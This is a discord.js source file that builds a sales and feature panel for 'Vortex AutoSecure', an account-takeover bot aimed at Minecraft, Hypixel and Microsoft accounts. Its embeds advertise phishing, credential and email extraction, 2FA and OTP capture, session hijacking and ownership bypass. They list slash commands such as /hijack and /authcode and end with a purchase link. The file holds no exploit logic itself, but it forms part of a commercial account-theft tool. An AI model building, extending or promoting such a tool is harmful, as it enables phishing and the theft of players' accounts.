const {
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} = require("discord.js");

const THUMBNAIL_GIF =
  "https://cdn.discordapp.com/attachments/1465727971829485865/1465729852412924014/IMG_0219.png?ex=698f42cc&is=698df14c&hm=d99767b91ca0c7f738d414409754cfdeb69aceb822d8039e47ac6124ecd0b498";

async function featurepanel() {
  try {
    const embed1 = new EmbedBuilder()
      .setTitle("⚙️ AUTOSECURE — MODULE OVERVIEW")
      .setDescription(
        "**Account takeover suite. Full control infrastructure. Highly customizable & modular.**\n\n" +
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
        "## 🤖 AUTOSECURE CORE\n" +
        "• Full automation suite\n" +
        "• Multi-bot orchestration\n" +
        "• High-volume account handling\n" +
        "• Ultra-secure verification flows\n" +
        "• Scalable infrastructure\n\n" +
        "## ⚙️ ACCOUNT INFILTRATION\n" +
        "• Phishing & verification\n" +
        "• Email & credential extraction\n" +
        "• Recovery code capture\n" +
        "• 2FA harvesting\n" +
        "• Token & session hijacking\n" +
        "• Xbox Live & Microsoft exploit chains\n" +
        "• Hypixel security bypass\n\n" +
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
      )
      .setColor(0x9b7cff)
      .setThumbnail(THUMBNAIL_GIF)
      .setFooter({ text: "Powered by Vortex AutoSecure" });

    const embed2 = new EmbedBuilder()
      .setTitle("⚡ ADVANCED ARSENAL")
      .setDescription(
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
        "## ⭐ GAME ACCOUNT EXPLOITATION\n" +
        "• Hypixel ban checking & quarantine\n" +
        "• DoomSMP & Minemen account checks\n" +
        "• Minecraft session exploitation\n" +
        "• Live inventory scanning\n" +
        "• Full alt inspection\n\n" +

        "## 🔒 CLAIMING SYSTEM\n" +
        "• SSID + email-only claim modes\n" +
        "• Auto-split logic for shared accounts\n" +
        "• Unlimited multi-claim\n" +
        "• Premium real-time claiming engine\n" +
        "• Advanced duplication protection\n\n" +

        "## 💎 PREMIUM FEATURES\n" +
        "• Automated ban appeals (soon)\n" +
        "• Hypixel automated appeal AI\n" +
        "• Premium claiming logic\n" +
        "• Multi-layer extraction chains\n\n" +
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
      )
      .setColor(0x9b7cff)
      .setThumbnail(THUMBNAIL_GIF)
      .setFooter({ text: "Powered by Vortex AutoSecure" });

    const embed3 = new EmbedBuilder()
      .setTitle("ℹ️ COMMAND REFERENCE")
      .setDescription(
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
        "## ⚡ EXECUTION\n" +
        "`/secure` — Full account securing\n" +
        "`/hijack` — Data extraction\n" +
        "`/ssidchecker` — SSID profiling\n" +
        "`/mail` — Full mail access\n\n" +

        "## 🚀 ESCALATION\n" +
        "`/authcode` — 2FA extraction\n" +
        "`/requestotp` — OTP capture\n" +
        "`/verifyaccount` — Ownership bypass\n" +
        "`/quarantine` — Lockdown isolation\n\n" +

        "## ⚙️ MAINTENANCE\n" +
        "`/mail_inbox` — (outlook inbox)\n" +
        "`/session` — Asset acquisition\n" +
        "`/donut, /minemen, /mctier` — Stats scanning\n\n" +
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        "**🚀 Vortex Autosecure.\n" +
        "⚡ Designed for power.\n" +
        "⚙️ Built for dominance.**"
      )
      .setColor(0x9b7cff)
      .setThumbnail(THUMBNAIL_GIF)
      .setFooter({ text: "Powered by Vortex AutoSecure" });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setLabel("🛒 Purchase AutoSecure")
        .setStyle(ButtonStyle.Link)
        .setURL("https://vortexsec.mysellauth.com")
    );

    return {
      content: null,
      embeds: [embed1, embed2, embed3],
      components: [row],
      attachments: [],
    };
  } catch (err) {
    console.error("Vortex creating feature panel:", err);
    return {
      content: "❌ Failed to generate feature panel",
      embeds: [],
      components: [],
      attachments: [],
    };
  }
}

module.exports = featurepanel;
